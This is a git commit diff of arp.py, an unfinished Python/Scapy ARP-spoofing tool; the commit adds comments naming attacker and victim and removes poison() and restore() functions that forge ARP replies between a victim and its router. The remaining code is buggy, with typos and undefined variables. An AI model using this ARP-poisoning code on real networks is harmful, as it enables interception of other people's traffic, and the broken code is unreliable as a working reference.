984c8466d78b8237979ceb3aa2bb3a4fd781e145
tumblery <whalswjddl1@naver.com>
2016-07-22 23:52:49 +0900

    It is not complete

--- arp.py
+++ arp.py
@@ -8,7 +8,7 @@ import time
 import thread
 import netifaces
 
-def GetIface():
+def GetIface():#get InterfaceList
 	inter = []
 	i = 1
 	for iface in netifaces.interfaces():
@@ -18,29 +18,21 @@ def GetIface():
 	num = input("interface:")
 	return inter[num-1]
 	
-def GetMyMac(interface):
+def GetMyMac(interface):#get attacker's Macadress
 	interInfo = netifaces.ifaddress(interface);
 	return interInfo[netifaces.AF_PACKET][0]['addr']
-def GetMyIP(interface):
+def GetMyIP(interface):#get attacker's IP
 	interInfo = netifaces.ifaddress(interface);
 	return interInfo[netifaces.AF_INET][0]['addr']
-def GetMyGateway(interface):
+def GetMyGateway(interface):#get atteacker's GatewayIP
 	return netifaces.gateways()['default'][netifaces.AF_INET][0]
 
-def parse_args():
+def parse_args():#To get victm's IP
     parser = argparse.ArgumentParser()
     parser.add_argument("-v", "--victimIP")
     return parser.parse_args()
 
-def poison(routerIP, victimIP, routerMAC, victimMAC):
-    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
-    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
-
-def restore(routerIP, victimIP, routerMAC, victimMAC):
-    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="00:00:00:00:00:00", hwsrc=victimMAC), count=3)
-    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="00:00:00:00:00:00", hwsrc=routerMAC), count=3)
-    sys.exit("losing...")
-def arp_monitor_callback(pkt):
+def arp_monitor_callback(pkt):#to arp monitoring
 	if ARP in pky and pkt[ARP].op in (1,2):
 		return pkt.sprintf("%ARP.hwscr% %ARP.psrc%")
 sniff(prn=arp_monitor_callback,filter="arp",store=0)
@@ -51,19 +43,18 @@ def main(args):
     MyGateway = GetMyGateway(iface)
     VI_IP = args[0]
     ###gatewayMAc
-    Pkt = Ether(src=MyMac,dst='ff:ff:ff:ff:ff:ff',type=2054)/ARP(hwdst='00:00:00:00:00:00',ptype=2048,hwtype=1,psrc=MyIP,hwlen=6,plen=4,pdst=VI_IP,hwsrc=MyMac, op=ARP.who_has)
+    Pkt = Ether(src=MyMac,dst='ff:ff:ff:ff:ff:ff',type=2054)/ARP(hwdst='00:00:00:00:00:00',ptype=2048,hwtype=1,psrc=MyIP,hwlen=6,plen=4,pdst=VI_IP,hwsrc=MyMac, op=ARP.who_has)#make a Packet to get gateway Macadress
     while GatewayM == "":
 	send(Pkt)
 	GatewayM = pipe.recv()
 	print GatewayM
     ###Victm MAc
-    Pkt = Ether(src=MyMac,dst='ff:ff:ff:ff:ff:ff',type=2054)/ARP(hwdst='00:00:00:00:00:00',ptype=2048,hwtype=1,psrc=MyIP,hwlen=6,plen=4,pdst=VI_IP,hwsrc=MyMac, op=ARP.who_has)
+    Pkt = Ether(src=MyMac,dst='ff:ff:ff:ff:ff:ff',type=2054)/ARP(hwdst='00:00:00:00:00:00',ptype=2048,hwtype=1,psrc=MyIP,hwlen=6,plen=4,pdst=VI_IP,hwsrc=MyMac, op=ARP.who_has)#make a Packet to get Victm's MacAdress 
     while V_M == "":
         send(Pkt)
         V_M = pipe.recv()
         print V_M
 
-   ####ARP
 if __name__ == "__main__":
  main(parse_args())
 
